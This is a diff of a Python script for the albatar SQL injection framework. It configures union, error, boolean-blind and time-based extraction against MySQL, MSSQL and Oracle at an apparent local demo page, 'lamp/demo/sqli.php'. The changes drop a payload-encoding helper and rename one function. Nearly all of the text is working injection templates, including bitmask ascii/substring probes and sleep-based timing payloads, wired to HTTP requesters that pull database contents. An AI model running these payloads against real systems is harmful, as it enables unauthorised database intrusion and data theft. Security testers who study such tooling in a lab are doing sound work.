@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 
 from albatar import *
-from urllib.parse import quote_plus
 import re
 
 PROXIES = {}#'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
@@ -22,9 +21,6 @@ def test_state_time(headers, body, time):
 def extract_results(headers, body, time):
   return re.findall(':ABC:(.+?):ABC:', body, re.S)
 
-def quote(s):
-  return quote_plus(s, safe='${}:(),')
-
 # MySQL {{{
 def mysql_union():
   '''
@@ -39,7 +35,6 @@ def mysql_union():
       url = 'http://lamp/demo/sqli.php?dbms=mysql&id=0${injection}',
       method = 'GET',
       response_processor = extract_results,
-      encode_payload = quote,
       )
 
   return Method_union(make_requester, template, pager=5)
@@ -70,12 +65,11 @@ def mysql_error():
       url = 'http://lamp/demo/sqli.php?dbms=mysql&id=1${injection}',
       method = 'GET',
       response_processor = extract_results,
-      encode_payload = quote,
       )
 
   return Method_error(make_requester, template)
 
-def mysql_boolean():
+def mysql_boolean_bitwise():
 
   def make_requester():
     return Requester_HTTP(
@@ -85,7 +79,6 @@ def mysql_boolean():
       body = 'id=1${injection}',
       method = 'POST',
       response_processor = test_state_grep,
-      encode_payload = quote,
       )
 
   template = ' and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}'
@@ -101,7 +94,6 @@ def mysql_boolean_regexp():
       body = 'id=1${injection}',
       method = 'POST',
       response_processor = test_state_grep,
-      encode_payload = quote,
       )
 
   template = ' and (${query}) regexp binary ${regexp}'
@@ -117,7 +109,6 @@ def mysql_boolean_binary():
       body = 'id=1${injection}',
       method = 'POST',
       response_processor = test_state_grep,
-      encode_payload = quote,
       )
 
   template = ' and ascii(substring((${query}),${char_pos},1))${comparator}${char_ord}'
@@ -125,7 +116,6 @@ def mysql_boolean_binary():
 
 def mysql_time():
 
-  template = ' and if(((ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}),sleep(1),1)'
 
   def make_requester():
     return Requester_HTTP(
@@ -134,9 +124,9 @@ def mysql_time():
       url = 'http://lamp/demo/sqli.php?dbms=mysql&id=1${injection}',
       method = 'GET',
       response_processor = test_state_time,
-      encode_payload = quote,
       )
 
+  template = ' and if(((ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}),sleep(1),1)'
   return Method_bitwise(make_requester, template, num_threads=1)
 
 # }}}
@@ -157,7 +147,6 @@ def mssql_union():
       url = 'http://lamp/demo/sqli.php?dbms=mssql&id=0${injection}',
       method = 'GET',
       response_processor = extract_results,
-      encode_payload = quote,
      )
 
   return Method_union(make_requester, template)
@@ -177,7 +166,6 @@ def mssql_error():
       url = 'http://lamp/demo/sqli.php?dbms=mssql&id=1${injection}',
       method = 'GET',
       response_processor = extract_results,
-      encode_payload = quote,
       )
 
   return Method_error(make_requester, template)
@@ -193,7 +181,6 @@ def mssql_boolean():
       url = 'http://lamp/demo/sqli.php?dbms=mssql&id=1${injection}',
       method = 'GET',
       response_processor = test_state_grep,
-      encode_payload = quote,
       )
 
   return Method_bitwise(make_requester, template)
@@ -209,7 +196,6 @@ def mssql_time():
       url = 'http://lamp/demo/sqli.php?dbms=mssql&id=1${injection}',
       method = 'GET',
       response_processor = test_state_time,
-      encode_payload = quote,
       )
 
   return Method_bitwise(make_requester, template, num_threads=1)
@@ -232,7 +218,6 @@ def oracle_union():
       url = 'http://lamp/demo/sqli.php?dbms=oracle&id=0${injection}',
       method = 'GET',
       response_processor = extract_results,
-      encode_payload = quote,
      )
 
   return Method_union(make_requester, template, )
@@ -258,7 +243,6 @@ def oracle_error():
       url = 'http://lamp/demo/sqli.php?dbms=oracle&id=1${injection}',
       method = 'GET',
       response_processor = extract_results,
-      encode_payload = quote,
      )
 
   return Method_error(make_requester, template, )
@@ -274,7 +258,6 @@ def oracle_boolean():
       url = 'http://lamp/demo/sqli.php?dbms=oracle&id=1${injection}',
       method = 'GET',
       response_processor = test_state_grep,
-      encode_payload = quote,
       )
 
   return Method_bitwise(make_requester, template, num_threads=1, rate_limit=.5)
@@ -287,7 +270,7 @@ def oracle_boolean():
 
 sqli = MySQL_Inband(mysql_union())
 #sqli = MySQL_Inband(mysql_error())
-#sqli = MySQL_Blind(mysql_boolean())
+#sqli = MySQL_Blind(mysql_boolean_bitwise())
 #sqli = MySQL_Blind(mysql_boolean_regexp())
 #sqli = MySQL_Blind(mysql_boolean_binary())
 #sqli = MySQL_Blind(mysql_time())
